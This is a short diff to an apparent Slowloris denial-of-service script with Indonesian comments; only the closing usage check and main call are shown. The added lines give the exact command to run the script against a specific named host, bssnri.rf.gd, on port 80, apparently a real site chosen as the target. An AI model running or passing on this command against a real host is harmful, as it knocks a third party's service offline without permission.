@@ -30,3 +30,6 @@ if __name__ == "__main__":
         print("Penggunaan: python slowloris.py <target> <port>")
         sys.exit(1)
     main(sys.argv[1], int(sys.argv[2]))
+
+# Jalankan script dengan perintah:
+# python slowloris.py http://bssnri.rf.gd 80
